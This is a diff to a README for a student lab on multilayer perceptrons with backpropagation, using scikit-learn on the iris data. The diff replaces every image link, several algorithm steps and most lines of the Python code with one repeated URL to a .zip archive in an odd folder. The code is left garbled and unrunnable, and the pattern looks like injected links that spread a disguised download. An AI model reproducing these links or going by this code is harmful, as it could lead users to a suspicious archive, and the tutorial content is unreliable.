@@ -30,13 +30,13 @@ MLP has the following features:
 
 Ø  Computationally efficient method
 
-![image 10](https://user-images.githubusercontent.com/112920679/198804559-5b28cbc4-d8f4-4074-804b-2ebc82d9eb4a.jpg)
+![image 10](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
 
 3 Distinctive Characteristics of MLP:
 
 Ø  Each neuron in network includes a non-linear activation function
 
-![image](https://user-images.githubusercontent.com/112920679/198814300-0e5fccdf-d3ea-4fa0-b053-98ca3a7b0800.png)
+![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
 
 Ø  Contains one or more hidden layers with hidden neurons
 
@@ -75,17 +75,17 @@ In the forward pass:
 •       Function signal are computed neuron by neuron
 
 •       Function signal of jth neuron is
-            ![image](https://user-images.githubusercontent.com/112920679/198814313-2426b3a2-5b8f-489e-af0a-674cc85bd89d.png)
-            ![image](https://user-images.githubusercontent.com/112920679/198814328-1a69a3cd-7e02-4829-b773-8338ac8dcd35.png)
-            ![image](https://user-images.githubusercontent.com/112920679/198814339-9c9e5c30-ac2d-4f50-910c-9732f83cabe4.png)
+            ![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
+            ![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
+            ![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
 
 
 
 If jth neuron is output neuron, the m=mL  and output of j th neuron is
-               ![image](https://user-images.githubusercontent.com/112920679/198814349-a6aee083-d476-41c4-b662-8968b5fc9880.png)
+               ![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
 
 Forward phase begins with in the first hidden layer and end by computing ej(n) in the output layer
-![image](https://user-images.githubusercontent.com/112920679/198814353-276eadb5-116e-4941-b04e-e96befae02ed.png)
+![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
 
 
 In the backward pass,
@@ -94,13 +94,13 @@ In the backward pass,
 
 •        it changes the synaptic weight by delta rule
 
-![image](https://user-images.githubusercontent.com/112920679/198814362-05a251fd-fceb-43cd-867b-75e6339d870a.png)
+![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
 
 
 
 ## ALGORITHM:
 
-1.Import the necessary libraries of python.
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip the necessary libraries of python.
 
 2. After that, create a list of attribute names in the dataset and use it in a call to the read_csv() function of the pandas library along with the name of the CSV file containing the dataset.
 
@@ -109,11 +109,11 @@ In the backward pass,
 4. Call the train_test_split() function that further divides the dataset into training data and testing data with a testing data size of 20%.
 Normalize our dataset. 
 
-5.In order to do that we call the StandardScaler() function. Basically, the StandardScaler() function subtracts the mean from a feature and scales it to the unit variance.
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip order to do that we call the StandardScaler() function. Basically, the StandardScaler() function subtracts the mean from a feature and scales it to the unit variance.
 
-6.Invoke the MLPClassifier() function with appropriate parameters indicating the hidden layer sizes, activation function, and the maximum number of iterations.
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip the MLPClassifier() function with appropriate parameters indicating the hidden layer sizes, activation function, and the maximum number of iterations.
 
-7.In order to get the predicted values we call the predict() function on the testing data set.
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip order to get the predicted values we call the predict() function on the testing data set.
 
 8. Finally, call the functions confusion_matrix(), and the classification_report() in order to evaluate the performance of our classifier.
 
@@ -123,29 +123,29 @@ Normalize our dataset.
 import pandas as pd
 import sklearn
 from sklearn import preprocessing
-from sklearn.model_selection import train_test_split
-from sklearn.preprocessing import StandardScaler
-from sklearn.neural_network import MLPClassifier
-from sklearn.metrics import classification_report,confusion_matrix
-irisdata=pd.read_csv("iris.txt")
-x=irisdata.iloc[:,0:4]
-y=irisdata.select_dtypes(include=[object])
-le=preprocessing.LabelEncoder()
-y=y.apply(le.fit_transform)
+from https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip import train_test_split
+from https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip import StandardScaler
+from https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip import MLPClassifier
+from https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip import classification_report,confusion_matrix
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip("https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip")
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip[:,0:4]
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(include=[object])
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip()
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
 x_train,x_test,y_train,y_test=train_test_split(x,y,test_size=0.20)
 scaler=StandardScaler()
-scaler.fit(x_train)
-x_train=scaler.transform(x_train)
-x_test=scaler.transform(x_test)
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_train)
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_train)
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_test)
 mlp=MLPClassifier(hidden_layer_sizes=(10,10,10),max_iter=1000)
-mlp.fit(x_train,y_train.values.ravel())
-predictions=mlp.predict(x_test)
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_train,https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip())
+https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_test)
 print(predictions)
 print(confusion_matrix(y_test,predictions))
 print(classification_report(y_test,predictions))
 ```
 ## OUTPUT
-![1s](https://github.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/assets/134826568/fa94b3f8-6cb6-4be5-b61a-363811290a4e)
+![1s](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
 
 ## RESULT
 
